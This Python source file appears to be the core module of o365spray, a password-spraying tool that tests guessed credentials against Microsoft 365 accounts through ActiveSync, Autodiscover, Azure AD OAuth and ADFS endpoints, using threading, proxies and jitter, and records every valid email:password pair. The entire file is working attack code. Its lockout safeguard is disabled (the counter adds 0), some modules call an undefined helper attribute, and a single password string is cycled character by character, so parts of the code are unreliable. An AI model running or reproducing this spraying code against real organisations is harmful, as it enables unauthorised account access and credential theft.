#!/usr/bin/env python3

# Based on: https://bitbucket.org/grimhacker/office365userenum/
#           https://github.com/Raikia/UhOh365
#           https://github.com/dafthack/MSOLSpray
#           '-> https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
#           https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py

# TODO: Test and validate each active module

import re
import time
import logging
import urllib3
import asyncio
import concurrent.futures
import concurrent.futures.thread
from typing import List, Dict, Union
from functools import partial
from itertools import cycle
from requests.auth import HTTPBasicAuth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from o365spray.core.handlers.base import BaseHandler  # type: ignore
from o365spray.core import (  # type: ignore
    Defaults,
    DefaultFiles,
    Helper,
    ThreadWriter,
    text_colors,
)


class Sprayer(BaseHandler):

    HELPER = Helper()  # Helper functions
    VALID_CREDENTIALS = []  # Valid credentials storage

    def __init__(
        self,
        loop: asyncio.unix_events._UnixSelectorEventLoop,
        module: str = "activesync",
        domain: str = None,
        userlist: List[str] = None,
        output_dir: str = None,
        timeout: int = 25,
        proxy: Union[str, Dict[str, str]] = None,
        workers: int = 5,
        lock_threshold: int = 5,
        adfs_url: str = None,
        writer: bool = True,
        sleep: int = 0,
        jitter: int = 0,
        *args,
        **kwargs,
    ):
        """Initialize a Sprayer instance.

        Note:
            All arguments, besides loop, are optional so that the Sprayer
            instance can be used to re-run the run() method multiple times
            against multiple domains/user lists without requiring a new instance
            or class level var modifications.

        Arguments:
            <required>
            loop: asyncio event loop
            <optional>
            module: spray module to run
            domain: domain to spray users against
            userlist: list of users to spray
            output_dir: directory to write results to
            timeout: http request timeout
            proxy: http request proxy
            workers: thread pool worker rate
            lock_threshold: locked account threashold
            adfs_url: ADFS AuthURL
            writer: toggle writing to output files
            sleep: throttle http requests
            jitter: randomize throttle

        Raises:
            ValueError: if no output directory provided when output writing
              is enabled
        """
        self._modules = {
            "autodiscover": self._autodiscover,
            "activesync": self._activesync,
            "msol": self._msol,
            "adfs": self._adfs,
        }

        if writer and not output_dir:
            raise ValueError("Missing 1 required argument: 'output_dir'")

        # If proxy server provided, build HTTP proxies object for
        # requests lib
        if isinstance(proxy, str):
            proxy = {"http": proxy, "https": proxy}

        self.loop = loop
        self.userlist = userlist
        self.module = module
        self.domain = domain
        self.timeout = timeout
        self.proxies = proxy
        self.locked_limit = lock_threshold
        self.adfs_url = adfs_url
        self.sleep = sleep
        self.jitter = jitter
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=workers)

        # Global locked account counter
        self.lockout = 0

        # Initialize writers
        self.writer = writer
        if self.writer:
            self.valid_writer = ThreadWriter(DefaultFiles.SPRAY_FILE, output_dir)
            self.tested_writer = ThreadWriter(DefaultFiles.SPRAY_TESTED, output_dir)

    def shutdown(self, key: bool = False):
        """Custom method to handle exitting multi-threaded tasking.

        Arguments:
            key: identify if we are shutting down normally or via a
              caught signal
        """
        msg = "\n\n[ ! ] CTRL-C caught." if key else "\n"
        if self.writer:
            msg += f"\n[ * ] Writing valid credentials to: '{self.valid_writer.output_file}'"  # ignore
            msg += f"\n[ * ] All sprayed credentials can be found at: '{self.tested_writer.output_file}'\n"

        print(Defaults.ERASE_LINE, end="\r")
        logging.info(msg)

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit

        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait: None

        # Close the open file handles
        if self.writer:
            self.valid_writer.close()
            self.tested_writer.close()

    def get_modules(self):
        """Return the list of module names."""
        return self._modules.keys()

    def _check_aadsts(
        self,
        user: str,
        email: str,
        password: str,
        response: str,
    ):
        """Helper function to parse X-AutoDiscovery-Error headers
        and/or response body for MS AADSTS errors.

        Arguments:
            user: initial username
            email: email formatted username
            password: password used during auth
            response: http reponse string to search
        """
        code = next(
            (c in response for c in Defaults.AADSTS_CODES.keys()),
            default=False,
        )
        if code:
            # This is where we handle lockout termination
            # Note: It appears that Autodiscover is now showing lockouts
            #       on accounts that are valid that failed authentication
            #       so we ignore this handling for now, but keep the logic
            #       in case we want to implement in the future.
            if code == "AADSTS50053":
                # Keep track of locked accounts seen
                self.lockout += 0  # 1

            err = Defaults.AADSTS_CODES[code][0]
            msg = Defaults.AADSTS_CODES[code][1]
            logging.info(
                f"[{text_colors.red}{err}{text_colors.reset}] "
                f"{email}:{password} "
                f"({msg}.)"
            )
            # Remove errored user from being sprayed again
            self.userlist.remove(user)

        else:
            print(
                f"[{text_colors.red}INVALID{text_colors.reset}] "
                f"{email}:{password}{' '*10}",
                end="\r",
            )

    # =============================
    # == -- AcitveSync MODULE -- ==
    # =============================

    def _activesync(self, domain: str, user: str, password: str):
        """Spray users on Microsoft using Microsoft Server ActiveSync
        https://bitbucket.org/grimhacker/office365userenum/

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Grab external headers from config.py and add special header
            # for ActiveSync
            headers = Defaults.HTTP_HEADERS
            headers["MS-ASProtocolVersion"] = "14.0"

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            auth = HTTPBasicAuth(email, password)
            url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            response = self._send_request(
                "options",
                url,
                auth=auth,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            # Note: 403 responses no longer indicate that an authentication attempt
            #       was valid, but now indicates invalid authentication attempts
            #       (whether it be invalid username or password). 401 responses
            #       also indicate an invalid authentication attempt
            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.green}VALID{text_colors.reset} {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                print(
                    f"[{text_colors.red}INVALID{text_colors.reset}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass

    # ===============================
    # == -- Autodiscover MODULE -- ==
    # ===============================

    def _autodiscover(self, domain: str, user: str, password: str):
        """Spray users on Microsoft using Microsoft Autodiscover
        https://github.com/Raikia/UhOh365

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.locked_limit:
                raise ValueError("Locked account limit reached.")

            # Build email if not already built
            email = self.helper.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            auth = HTTPBasicAuth(email, password)
            url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
            response = self._send_request(
                "get",
                url,
                auth=auth,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.green}VALID{text_colors.reset}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            # Handle accounts that appear valid, but could have another factor
            # blocking full authentication
            elif status == 456:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.green}VALID{text_colors.reset}] {email}:{password}"
                    " (Manually confirm [MFA, Locked, etc.])"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            # Handle Autodiscover errors that are returned by the server
            elif "X-AutoDiscovery-Error" in response.headers.keys():
                # Handle Basic Auth blocking
                if any(
                    str_ in response.headers["X-AutoDiscovery-Error"]
                    for str_ in Defaults.BASICAUTH_ERRORS
                ):
                    logging.info(
                        f"[{text_colors.red}BLOCKED{text_colors.reset}] {email}:{password}"
                        " (Basic Auth blocked for this user.)"
                    )
                    # Remove basic auth blocked user from being sprayed again
                    self.userlist.remove(user)

                # Handle Microsoft AADSTS errors
                else:
                    self._check_aadsts(
                        user,
                        email,
                        password,
                        response.headers["X-AutoDiscovery-Error"],
                    )

            else:
                print(
                    f"[{text_colors.red}INVALID{text_colors.reset}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass

    # =======================
    # == -- MSOL MODULE -- ==
    # =======================

    def _msol(self, domain: str, user: str, password: str):
        """Spray users on Microsoft using Azure AD
        https://github.com/dafthack/MSOLSpray
        https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.locked_limit:
                raise ValueError("Locked account limit reached.")

            # Build email if not already built
            email = self.helper.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Grab external headers from config.py
            headers = Defaults.HTTP_HEADERS
            headers["Accept"] = ("application/json",)
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = {
                "resource": "https://graph.windows.net",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                "client_info": "1",
                "grant_type": "password",
                # TODO: Do we want username or email here...
                "username": email,
                "password": password,
                "scope": "openid",
            }

            url = "https://login.microsoft.com/common/oauth2/token"
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.green}VALID{text_colors.reset}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                # Handle Microsoft AADSTS errors
                body = response.json()
                error = body["error_description"].split("\r\n")[0]
                self._check_aadsts(
                    user,
                    email,
                    password,
                    error,
                )

        except Exception as e:
            logging.debug(e)
            pass

    # =======================
    # == -- ADFS MODULE -- ==
    # =======================

    def _adfs(self, domain: str, user: str, password: str):
        """Spray users via a managed ADFS server
        https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Grab external headers from config.py
            headers = Defaults.HTTP_HEADERS

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Fix the ADFS URL for each user since the AuthUrl was pulled during
            # validation using a bogus user
            # TODO: Stress test this shitty regex...
            url = re.sub(
                r"(username=).+(&?)",
                fr"\1{user}\2",
                self.adfs_url,
            )
            data = "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (
                email,
                password,
            )
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 302:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.green}VALID{text_colors.reset}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                print(
                    f"[{text_colors.red}INVALID{text_colors.reset}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass

    async def run(
        self,
        password: Union[str, List[str]],
        domain: str = None,
        module: str = None,
        userlist: List[str] = None,
    ):
        """Asyncronously Send HTTP Requests to password spray a list of users.
        This method's params override the class' level of params.

        Publicly accessible class method. To implement and run
        this method from another script:
        ```
            from o365spray.core import Enumerator
            loop = asyncio.get_event_loop()
            s = Sprayer(loop, writer=False)
            loop.run_until_complete(
                s.run(
                    password,
                    domain,
                    module,
                    userlist,
                )
            )
            loop.run_until_complete()
            loop.close()
            list_of_valid_creds = s.VALID_CREDENTIALS
        ```

        Arguments:
            <required>
            password: single or multiple passwords based on if a spray
              should be run as paired
            <optional>
            module: spray module to run
            domain: domain to spray users against
            userlist: list of users to spray
        """
        # Re-initialize the class userlist each run if a user provides
        # a new list - otherwise use the current class list
        self.userlist = userlist or self.userlist
        if not self.userlist:
            raise ValueError("No user list provided for spraying.")
        if not isinstance(self.userlist, list):
            raise ValueError(
                f"Provided user list is not a list -> provided: {type(self.userlist)}"
            )

        domain = domain or self.domain
        if not domain:
            raise ValueError(f"Invalid domain for password spraying: '{domain}'")

        module = module or self.module
        if module not in self._modules.keys():
            raise ValueError(f"Invalid password spraying module name: '{module}'")

        if isinstance(password, list):
            # Since we assume this is our --paired handling, we will also
            # assume that the user list and password list are the same
            # length
            creds = zip(self.userlist, password)
        else:
            # Assume the password is not an object like a dict or instance
            # and that a single string/int/value was passed
            creds = zip(self.userlist, cycle(password))

        module_f = self._modules[module]
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor,
                partial(
                    module_f,
                    domain=domain,
                    user=user,
                    password=passwd,
                ),
            )
            for user, passwd in creds
        ]

        if blocking_tasks:
            await asyncio.wait(blocking_tasks)
